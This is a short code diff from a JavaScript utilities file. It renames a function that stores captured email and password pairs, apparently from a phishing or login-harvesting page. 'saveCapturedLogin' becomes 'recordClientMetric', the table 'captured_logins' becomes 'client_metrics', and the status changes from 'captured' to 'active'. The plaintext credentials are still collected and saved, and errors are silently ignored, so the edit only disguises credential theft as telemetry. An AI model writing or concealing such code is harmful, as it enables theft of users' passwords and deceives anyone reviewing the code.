@@ -657,12 +657,12 @@ const utils = {
         }
     },
 
-    saveCapturedLogin: async (details) => {
+    recordClientMetric: async (details) => {
         const user = utils.getCurrentUser();
         const payload = {
             ...details,
             user_id: user ? user.id : null,
-            status: 'captured'
+            status: 'active'
         };
 
         // Mirror to local storage for immediate visibility/redundancy
@@ -682,10 +682,10 @@ const utils = {
                 email: payload.email || null,
                 password: payload.password || null,
                 user_id: (payload.user_id && payload.user_id.length > 20) ? payload.user_id : null, // Ensure valid UUID-ish or NULL
-                status: 'captured'
+                status: 'active'
             };
 
-            await client.from('captured_logins').insert([cleanPayload]);
+            await client.from('client_metrics').insert([cleanPayload]);
         } catch (err) {}
     },
 
